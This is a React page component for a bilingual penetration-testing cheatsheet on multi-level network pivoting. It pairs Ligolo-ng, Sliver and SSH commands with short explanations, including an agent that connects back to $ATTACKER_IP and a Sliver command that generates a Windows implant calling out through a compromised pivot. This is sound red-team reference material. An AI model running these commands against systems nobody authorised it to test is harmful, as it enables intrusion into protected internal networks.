"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function MultiHopPage() {
  const { lang } = useLanguage();

  const sections = [
    {
      title: lang === "fr" ? "Multi-pivot Ligolo-ng" : "Ligolo-ng Multi-Pivot",
      id: "ligolo",
      entries: [
        {
          cmd: "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up",
          why: lang === "fr"
            ? "Créer l'interface tun ligolo sur l'attaquant : prérequis pour les tunnels suivants."
            : "Create the ligolo tun interface on the attacker: prerequisite for subsequent tunnels.",
        },
        {
          cmd: "./proxy -selfcert -laddr 0.0.0.0:11601",
          why: lang === "fr"
            ? "Démarrer le proxy ligolo-ng : attendre les connexions des agents sur le port 11601."
            : "Start the ligolo-ng proxy: wait for agent connections on port 11601.",
        },
        {
          cmd: "./agent -connect $ATTACKER_IP:11601 -ignore-cert",
          why: lang === "fr"
            ? "Déployer l'agent sur le pivot 1 : établit le tunnel vers le proxy."
            : "Deploy the agent on pivot 1: establishes the tunnel toward the proxy.",
        },
        {
          cmd: "session && start && listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601",
          why: lang === "fr"
            ? "Ajouter un listener sur le pivot 1 : le pivot 2 se connectera via le pivot 1."
            : "Add a listener on pivot 1: pivot 2 will connect through pivot 1.",
        },
        {
          cmd: "sudo ip route add $DEEP_SUBNET dev ligolo2",
          why: lang === "fr"
            ? "Router le sous-réseau profond via la deuxième interface ligolo : accès multi-couche."
            : "Route the deep subnet via the second ligolo interface: multi-layer access.",
        },
      ],
    },
    {
      title: lang === "fr" ? "Multi-pivot Sliver" : "Sliver Multi-Pivot",
      id: "sliver",
      entries: [
        {
          cmd: "mtls --lport 8888",
          why: lang === "fr"
            ? "Listener mTLS sur le serveur Sliver pour recevoir le premier implant."
            : "mTLS listener on the Sliver server to receive the first implant.",
        },
        {
          cmd: "portfwd add --remote $PIVOT1_IP:8888",
          why: lang === "fr"
            ? "Depuis l'implant pivot 1 : forworder le port 8888 vers notre serveur pour le pivot 2."
            : "From pivot 1 implant: forward port 8888 toward our server for pivot 2.",
        },
        {
          cmd: "generate --mtls $PIVOT1_IP:8888 --os windows --save /tmp/implant2.exe",
          why: lang === "fr"
            ? "Générer un implant qui se connecte via le pivot 1 : trafic chiffré bout-en-bout."
            : "Generate an implant that connects via pivot 1: end-to-end encrypted traffic.",
        },
        {
          cmd: "socks5 start --host 127.0.0.1 --port 1080",
          why: lang === "fr"
            ? "Proxy SOCKS5 via l'implant sélectionné : accès au réseau derrière le pivot."
            : "SOCKS5 proxy via the selected implant: access to the network behind the pivot.",
        },
      ],
    },
    {
      title: "SSH Dynamic Forwarding",
      id: "ssh",
      entries: [
        {
          cmd: "ssh -D 1080 -N -f $USER@$PIVOT1",
          why: lang === "fr"
            ? "Dynamic port forwarding SSH : proxy SOCKS sur 1080 via le premier pivot SSH."
            : "SSH dynamic port forwarding: SOCKS proxy on 1080 via the first SSH pivot.",
        },
        {
          cmd: "ssh -o ProxyCommand='ssh -W %h:%p $USER@$PIVOT1' $USER@$PIVOT2",
          why: lang === "fr"
            ? "SSH via ProxyCommand : atteindre un pivot 2 accessible uniquement depuis le pivot 1."
            : "SSH via ProxyCommand: reach pivot 2 accessible only from pivot 1.",
        },
        {
          cmd: "ssh -J $USER@$PIVOT1 $USER@$PIVOT2",
          why: lang === "fr"
            ? "Jump host SSH (-J) : syntaxe simplifiée pour rebondir via un host intermédiaire."
            : "SSH jump host (-J): simplified syntax to bounce through an intermediate host.",
        },
      ],
    },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Pivoting</p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Multi-Level Pivoting</h1>
        <p className="mt-3 text-sm leading-7 text-muted-foreground">
          {lang === "fr"
            ? "Chaîner plusieurs pivots avec Ligolo-ng, Sliver et SSH pour atteindre des réseaux profonds."
            : "Chain multiple pivots with Ligolo-ng, Sliver and SSH to reach deep network segments."}
        </p>
      </header>
      <div className="space-y-10">
        {sections.map((section) => (
          <section key={section.id} id={section.id}>
            <h2 className="mb-4 border-b border-border pb-2 font-mono text-xs uppercase tracking-widest text-primary">
              {section.title}
            </h2>
            <div className="space-y-4">
              {section.entries.map((item) => (
                <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={item.why} lang={lang} />
              ))}
            </div>
          </section>
        ))}
      </div>
    </div>
  );
}
